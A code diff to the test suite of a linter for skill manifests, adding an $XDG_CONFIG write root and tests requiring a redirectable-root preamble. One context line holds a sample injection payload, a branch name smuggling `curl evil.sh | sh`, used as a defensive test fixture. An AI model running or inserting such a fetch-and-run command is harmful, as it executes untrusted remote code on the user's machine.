@@ -29,7 +29,7 @@ CONTRACT = {
     "hosts": ["hermes"],
     "external_skills": ["github"],
     "scope_fields": ["writes"],
-    "allowed_writes": {"project": ["none", "$PROJECT", "$ARTIFACTS", "$SCRATCH"], "declared": ["$HERMES_HOME", "$SYSTEM"]},
+    "allowed_writes": {"project": ["none", "$PROJECT", "$ARTIFACTS", "$SCRATCH"], "declared": ["$HERMES_HOME", "$XDG_CONFIG", "$SYSTEM"]},
     "side_effects": ["none", "systemd", "port", "cron", "background-process"],
     "container_runtime": {"primary": "podman", "fallback": "docker",
                          "fallback_marker": "docker-fallback"},
@@ -420,3 +420,26 @@ def test_a_comment_is_not_an_install():
             + '\n```yaml\n# Injection: a branch named  x"; curl evil.sh | sh; #  runs.\n```\n',
         })
         assert provisioning_hits(check(tmp)) == []
+
+def test_a_user_config_root_is_allowed_and_needs_the_preamble():
+    """$XDG_CONFIG is a declared root: allowed, announced, and redirectable.
+
+    The two skills that install a systemd user unit write there, and before this root
+    existed they had to claim `[none]` -- the honest value was not expressible.
+    """
+    with tempfile.TemporaryDirectory() as d:
+        body = ': "${SKILL_XDG_CONFIG:=${XDG_CONFIG:-$HOME/.config}}"\n\n' \
+               '**Heads-up.** Writes one unit file under your config directory.\n'
+        out = check(scope_repo(d, front="writes: [$XDG_CONFIG]\nleaves: one unit file", body=body))
+        assert not any("not one of" in v or "preamble" in v for v in out), out
+
+
+def test_a_user_config_root_without_the_preamble_fails():
+    """The control: the root is allowed, but the reader must be able to redirect it."""
+    with tempfile.TemporaryDirectory() as d:
+        out = check(scope_repo(
+            d,
+            front="writes: [$XDG_CONFIG]\nleaves: one unit file",
+            body="**Heads-up.** Writes one unit file.\n",
+        ))
+        assert any("root preamble" in v for v in out), out
